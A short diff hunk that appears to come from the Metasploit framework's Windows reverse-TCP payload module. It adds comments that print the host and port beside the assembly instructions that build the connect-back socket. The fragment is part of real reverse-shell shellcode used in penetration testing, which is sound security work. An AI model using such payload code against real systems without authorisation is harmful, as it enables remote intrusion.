@@ -125,8 +125,8 @@ module Payload::Windows::ReverseTcp
         push #{retry_count}     ; retry counter
 
       create_socket:
-        push #{encoded_host}    ; host in little-endian format
-        push #{encoded_port}    ; family AF_INET and port number
+        push #{encoded_host}    ; host in little-endian format - #{opts[:host]}
+        push #{encoded_port}    ; family AF_INET and port number - #{opts[:port]}
         mov esi, esp            ; save pointer to sockaddr struct
 
         push eax                ; if we succeed, eax will be zero, push zero for the flags param.
